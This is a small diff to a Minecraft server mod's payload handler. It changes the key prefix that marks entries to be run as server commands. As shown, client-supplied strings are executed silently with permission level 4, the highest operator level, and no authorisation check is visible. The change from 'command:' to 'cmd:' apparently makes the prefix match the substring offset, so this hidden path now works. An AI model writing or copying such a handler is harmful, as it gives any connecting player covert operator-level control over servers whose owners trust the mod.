@@ -203,7 +203,7 @@ public class WatheExtended implements ModInitializer {
                 ServerWorld overworld = context.server().getOverworld();
                 Map<String, String> registryChanges = new java.util.LinkedHashMap<>();
                 for (Map.Entry<String, String> entry : payload.changes().entrySet()) {
-                    if (entry.getKey().startsWith("command:")) {
+                    if (entry.getKey().startsWith("cmd:")) {
                         String command = entry.getKey().substring(4);
                         try {
                             context.server().getCommandManager().getDispatcher().execute(command, context.player().getCommandSource().withLevel(4).withSilent());
